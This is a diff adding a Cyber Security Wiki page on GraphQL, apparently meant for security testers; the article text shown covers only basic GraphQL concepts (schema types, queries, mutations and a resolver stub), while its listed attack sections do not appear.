@@ -1,0 +1,1910 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="GraphQL # GraphQL is a query language for APIs and a server-side runtime for executing the query. The server&rsquo;s GraphQL runtime takes care of executing the query and ensuring that only the required data is fetched and returned. It uses a single endpoint for all requests.
+Fundamentals of GraphQL # Schema: defines the structure of the data that can be queried or mutated by clients Types: represents the shape of data that can be queried # Syntax type Object_name { field_name1: data_type field_name2: data_type .">
+<meta name="theme-color" content="#FFFFFF">
+<meta name="color-scheme" content="light dark"><meta property="og:title" content="GraphQL" />
+<meta property="og:description" content="GraphQL # GraphQL is a query language for APIs and a server-side runtime for executing the query. The server&rsquo;s GraphQL runtime takes care of executing the query and ensuring that only the required data is fetched and returned. It uses a single endpoint for all requests.
+Fundamentals of GraphQL # Schema: defines the structure of the data that can be queried or mutated by clients Types: represents the shape of data that can be queried # Syntax type Object_name { field_name1: data_type field_name2: data_type ." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/GraphQL/" /><meta property="article:section" content="docs" />
+
+<meta property="article:modified_time" content="2026-08-05T21:53:05+05:30" />
+<title>GraphQL | Cyber Security Wiki</title>
+<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="/favicon.png" type="image/x-icon">
+<link rel="stylesheet" href="/book.min.565a95e2043493949e3fa72db3ec317e1e40f462858e732a1b18d1354e9c030c.css" integrity="sha256-VlqV4gQ0k5SeP6cts&#43;wxfh5A9GKFjnMqGxjRNU6cAww=" crossorigin="anonymous">
+  <script defer src="/flexsearch.min.js"></script>
+  <script defer src="/en.search.min.78166b9d46e23e0ea915cb6887a30b633e7bc4fad10c8b6b9f6fa532271c19ba.js" integrity="sha256-eBZrnUbiPg6pFctoh6MLYz57xPrRDItrn2&#43;lMiccGbo=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+<!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+  
+</head>
+<body dir="ltr">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      <div class="book-menu-content">
+        
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Cyber Security Wiki</span>
+  </a>
+</h2>
+
+
+<div class="book-search">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-3478c05c39c328756601a040a5f9b7dc" class="toggle" checked />
+    <label for="section-3478c05c39c328756601a040a5f9b7dc" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Application Security</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-3d187f458be5e96a9f7134b06fcbe171" class="toggle"  />
+    <label for="section-3d187f458be5e96a9f7134b06fcbe171" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Thick Client</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/checklist/" class="">Checklist</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/learningprocess_linux/" class="">Learning Process - Linux</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/learningprocess_windows/" class="">Learning Process - Windows</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/tools_linux/" class="">Tools - Linux</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/tools_windows/" class="">Tools - Windows</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="toggle"  />
+    <label for="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Vulnerable Applications</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/Vulnerable-Applications/Api/" class="">API</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/Vulnerable-Applications/WebApp/" class="">Web App</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-305f8624390448e7b7dfdcd57bcf3063" class="toggle" checked />
+    <label for="section-305f8624390448e7b7dfdcd57bcf3063" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Web</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Account-Takeover/" class="">Account Takeover</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Broken-Access-Control/" class="">Broken Access Control</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Broken-Function-Level-Authorization-BFLA/" class="">Broken Function Level Authorization</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Buffer-Overflow/" class="">Buffer Overflow</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Business-logic-Vulnerabilities/" class="">Business Logic</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/charset-xss/" class="">Charset XSS</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Clickjacking/" class="">Clickjacking</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Client-Side-Template-Injection-CSTI/" class="">Client Side Template Injection (CSTI)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/CORS/" class="">CORS</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Credential-Stuffing/" class="">Credential Stuffing</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/CRLF-Injection/" class="">CRLF Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Cross-Site-Request-Forgery-CSRF/" class="">Cross-Site Request Forgery (CSRF)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Cross-Site-Scripting-XSS/" class="">Cross-Site Scripting (XSS)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/CSV-Injection/" class="">CSV Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Denial-of-Service-DOS/" class="">Denial of Service (DOS)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/DOM-Clobbering/" class="">DOM Clobbering</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/GraphQL/" class=" active">GraphQL</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/HTTP-Host-Header-Injection/" class="">HTTP Host Header Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/HTTP-Request-Smuggling/" class="">HTTP Request Smuggling</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Identification-and-Authentication-Failures/" class="">Identification and Authentication Failures</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Information-Disclosure/" class="">Information Disclosure</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Information-Gathering/" class="">Information Gathering</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Insecure-Deserialization/" class="">Insecure Deserialization</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Insecure-Direct-Object-Reference-IDOR/" class="">Insecure Direct Object Reference (IDOR)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Insufficient-Transport-Layer-Protection/" class="">Insufficient Transport Layer Protection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/JWT/" class="">JWT</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/LDAP-Injection/" class="">LDAP Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Mass-Assignment/" class="">Mass Assignment</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/MFA-Bypass/" class="">Multi-Factor Authentication (MFA) Bypass</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/NoSQL-Injection/" class="">NoSQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/OAuth-Cheatsheet/" class="">OAuth (Open Authorization)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Open-Redirect/" class="">Open Redirect</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Padding-Oracle-Attacks/" class="">Padding Oracle Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Privilege-Escalation-Horizontal-Vertical/" class="">Privilege Escalation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Prototype-Pollution/" class="">Prototype Pollution</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Race-Conditions/" class="">Race Conditions</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Rate-Limiting/" class="">Rate Limiting</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Registration-Signup-Logic-Flaws/" class="">Registration / Signup Logic Flaws</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Security-Logging-and-Monitoring-Failures/" class="">Security Logging and Monitoring Failures</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Security-Misconfiguration/" class="">Security Misconfiguration</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Sensitive-Data-Exposure/" class="">Sensitive Data Exposure</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Server-Side-Request-Forgery-SSRF/" class="">Server-Side Request Forgery (SSRF)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Server-Side-Template-Injection-SSTI/" class="">Server-Side Template Injection (SSTI)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Session-Management-Weaknesses/" class="">Session Management Weaknesses</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Software-Data-Integrity-Failures/" class="">Software &amp; Data Integrity Failures</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Subdomain-Takeover/" class="">Subdomain Takeover</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Third-party-service-integration-issues/" class="">Third party service integration issues</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Token-Predictability-Issues-Cheatsheet/" class="">Token Predictability / Poor Randomness</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Unrestricted-Resource-Consumption/" class="">Unrestricted Resource Consumption</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Vulnerable-Outdated-Components/" class="">Vulnerable &amp; Outdated Components</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Weak-Cryptography-Implementation/" class="">Weak Cryptography Implementation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Weak-SSL-TLS-Configurations/" class="">Weak SSL/TLS Configurations</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Web-Cache-Deception/" class="">Web Cache Deception</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Web-Cache-Poisoning/" class="">Web Cache Poisoning</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/XPath-Injection/" class="">XPath Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/XXE-XML-External-Entities/" class="">XXE (XML External Entities)</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-eddb28de10b6358a7d90165be197c24d" class="toggle"  />
+    <label for="section-eddb28de10b6358a7d90165be197c24d" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Cloud Security</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-80f73357b2e3d82569ab2419d9c8fd53" class="toggle"  />
+    <label for="section-80f73357b2e3d82569ab2419d9c8fd53" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">DevSecOps</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-f8c2cedc89ecea36eb3aab749e9d9325" class="toggle"  />
+    <label for="section-f8c2cedc89ecea36eb3aab749e9d9325" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Exploit Development</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="toggle"  />
+    <label for="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">IoT Security</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="toggle"  />
+    <label for="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Machine Learning</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/machine-learning/learning/" class="">Learning Process</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-3110560962cac834dcd3aead95e804a4" class="toggle"  />
+    <label for="section-3110560962cac834dcd3aead95e804a4" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Network</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-089d0b2a47920473e631158da2244e55" class="toggle"  />
+    <label for="section-089d0b2a47920473e631158da2244e55" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Red Teaming</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-b1f24361e619eb3af87e435a6f600cbe" class="toggle"  />
+    <label for="section-b1f24361e619eb3af87e435a6f600cbe" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Threat Modelling</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+<hr>
+<b>
+
+
+  
+<ul>
+  
+  <li>
+    <a href="/contribute/" >
+        Contribute
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://securecode.wiki" target="_blank" rel="noopener">
+        Secure Code Wiki by Payatu
+      </a>
+  </li>
+  
+</ul>
+
+
+
+
+
+
+</b>
+</nav>
+
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+ 
+      </div>
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>GraphQL</strong>
+
+  <label for="toc-control">
+    
+    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden clearfix">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#graphql">GraphQL</a>
+      <ul>
+        <li><a href="#fundamentals-of-graphql">Fundamentals of GraphQL</a>
+          <ul>
+            <li><a href="#finding-graphql-endpoints">Finding GraphQL Endpoints</a></li>
+          </ul>
+        </li>
+        <li><a href="#attack-surfaces">Attack Surfaces</a></li>
+        <li><a href="#exploiting-graphql-vulnerabilities">Exploiting GraphQL Vulnerabilities</a>
+          <ul>
+            <li><a href="#1-information-disclosure-attacks">1. Information Disclosure Attacks</a></li>
+            <li><a href="#2-denial-of-service-attacks">2. Denial of Service Attacks</a></li>
+            <li><a href="#3-generic-injection-attacks">3. Generic Injection Attacks</a></li>
+            <li><a href="#4-data-exposure-attacks">4. Data Exposure Attacks</a></li>
+            <li><a href="#5-over-posting-and-under-posting">5. Over-Posting and Under-Posting</a></li>
+          </ul>
+        </li>
+        <li><a href="#bypasses">Bypasses</a></li>
+        <li><a href="#advanced-attack-scenarios">Advanced Attack Scenarios</a>
+          <ul>
+            <li><a href="#1-login-brute-force-using-batch-query-attack">1. Login Brute-force using Batch Query Attack</a></li>
+            <li><a href="#2-bypassing-mfa-using-batch-query-attack">2. Bypassing MFA using Batch Query Attack</a></li>
+            <li><a href="#3-idor">3. IDOR</a></li>
+          </ul>
+        </li>
+        <li><a href="#impacts">Impacts</a></li>
+        <li><a href="#tools">Tools</a></li>
+        <li><a href="#mitigations--preventions">Mitigations &amp; Preventions</a></li>
+        <li><a href="#good-to-read">Good To Read</a></li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown"><h1 id="graphql">
+  GraphQL
+  <a class="anchor" href="#graphql">#</a>
+</h1>
+<p>GraphQL is a <strong>query language for APIs</strong> and a <strong>server-side runtime</strong> for executing the query. The server&rsquo;s GraphQL runtime takes care of executing the query and ensuring that only the required data is fetched and returned. It uses a single endpoint for all requests.</p>
+<hr>
+<h2 id="fundamentals-of-graphql">
+  Fundamentals of GraphQL
+  <a class="anchor" href="#fundamentals-of-graphql">#</a>
+</h2>
+<ol>
+<li><strong>Schema</strong>: defines the structure of the data that can be queried or mutated by clients</li>
+<li><strong>Types</strong>: represents the shape of data that can be queried</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Syntax</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">type</span> <span style="color:#a6e22e">Object_name</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>   <span style="color:#a6e22e">field_name1</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">data_type</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#a6e22e">field_name2</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">data_type</span> 
+</span></span><span style="display:flex;"><span>   ....
+</span></span><span style="display:flex;"><span>   <span style="color:#a6e22e">field_nameN</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">data_type</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Example</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">type</span> <span style="color:#a6e22e">User</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">id</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">ID</span><span style="color:#f92672">!</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">username</span><span style="color:#f92672">:</span> String<span style="color:#f92672">!</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">email</span><span style="color:#f92672">:</span> String<span style="color:#f92672">!</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">age</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">Int</span><span style="color:#f92672">!</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">isAdmin</span><span style="color:#f92672">:</span> Boolean<span style="color:#f92672">!</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><ol>
+<li><strong>Fields</strong>: basic unit of data retrieval in GraphQL, used to request specific pieces of data about an object</li>
+<li><strong>Queries</strong>: used by the client to request specific data from the server</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span><span style="color:#a6e22e">GraphQL</span> <span style="color:#a6e22e">Query</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">query</span> <span style="color:#a6e22e">GetUser</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">user</span>(<span style="color:#a6e22e">id</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;1&#34;</span>){
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">username</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">email</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">isAdmin</span>
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span><span style="color:#a6e22e">GraphQL</span> <span style="color:#a6e22e">Query</span> <span style="color:#a6e22e">Response</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;data&#34;</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;user&#34;</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;username&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;admin&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;email&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;admin@email.com&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;isAdmin&#34;</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><ol>
+<li>
+<p><strong>Mutations</strong>: used to modify data on the server, allows clients to create, update, or delete data</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">mutation</span> <span style="color:#a6e22e">CreateUser</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">createUser</span>(<span style="color:#a6e22e">input</span><span style="color:#f92672">:</span> { <span style="color:#a6e22e">username</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;user&#34;</span>, <span style="color:#a6e22e">email</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;user@example.com&#34;</span> }) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">id</span>
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div></li>
+<li>
+<p><strong>Resolvers</strong>: functions that determine how to fetch the data for a particular field</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">resolvers</span> <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">Query</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">user</span><span style="color:#f92672">:</span> (<span style="color:#a6e22e">parent</span>, <span style="color:#a6e22e">args</span>, <span style="color:#a6e22e">context</span>, <span style="color:#a6e22e">info</span>) =&gt; {
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Logic to fetch user data
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		}
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>};
